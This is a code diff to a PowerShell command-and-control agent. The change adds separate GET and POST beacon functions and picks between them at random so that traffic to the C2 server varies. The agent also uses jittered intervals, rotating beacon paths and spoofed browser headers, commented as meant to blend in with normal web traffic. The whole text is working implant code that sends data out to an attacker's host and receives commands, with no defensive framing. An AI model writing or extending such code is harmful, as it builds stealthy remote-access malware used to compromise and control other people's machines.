@@ -378,6 +378,62 @@ function Process-Commands {
     }
 }
 
+# Function to perform a GET beacon request
+function Send-GetBeacon {
+    param(
+        [string]$Url,
+        [string]$EncodedData,
+        [string]$Token
+    )
+    
+    try {
+        # Create a query string with data and token
+        $queryString = "?data=$([System.Uri]::EscapeDataString($EncodedData))&token=$([System.Uri]::EscapeDataString($Token))"
+        $fullUrl = "$Url$queryString"
+        
+        # Create web client and set headers
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+        $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
+        
+        # Download the response as a string
+        Write-Host "Sending GET beacon to $fullUrl"
+        $response = $webClient.DownloadString($fullUrl)
+        return $response
+    }
+    catch {
+        Write-Host "Error in GET beacon: $_"
+        throw
+    }
+}
+
+# Function to perform a POST beacon request
+function Send-PostBeacon {
+    param(
+        [string]$Url,
+        [string]$PayloadJson
+    )
+    
+    try {
+        # Create web client and set headers
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+        $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
+        $webClient.Headers.Add("Content-Type", "application/json")
+        
+        # Send the POST request
+        Write-Host "Sending POST beacon to $Url"
+        $response = $webClient.UploadString($Url, "POST", $PayloadJson)
+        return $response
+    }
+    catch {
+        Write-Host "Error in POST beacon: $_"
+        throw
+    }
+}
+
 # Function to check rotation times
 function Check-PathRotation {
     $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
@@ -449,15 +505,6 @@ function Start-AgentLoop {
             $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
             $actualInterval = $beaconInterval * $jitterFactor
             
-            # Create web client for C2 communication
-            $webClient = New-Object System.Net.WebClient
-            
-            # Add only standard headers to blend in with normal web traffic - no custom headers
-            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-            $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
-            $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
-            $webClient.Headers.Add("Content-Type", "application/json")
-            
             # Get current beacon path based on rotation status
             $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
                 Get-CurrentPath -PathType "beacon_path" 
@@ -496,9 +543,17 @@ function Start-AgentLoop {
             
             $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
             
-            # Beacon to the C2 server
-            Write-Host "Beaconing to $beaconUrl"
-            $response = $webClient.UploadString($beaconUrl, "POST", $beaconJson)
+            # Randomly decide between GET and POST for this beacon
+            # First contact always uses POST for simplicity
+            $useGetMethod = (-not $global:firstContact) -and ((Get-Random -Minimum 1 -Maximum 100) -le 50)
+            
+            # Beacon to the C2 server using either GET or POST
+            $response = ""
+            if ($useGetMethod) {
+                $response = Send-GetBeacon -Url $beaconUrl -EncodedData $beaconPayload.data -Token $randomToken
+            } else {
+                $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson
+            }
             
             # Process response data
             $responseObject = ConvertFrom-Json -InputObject $response
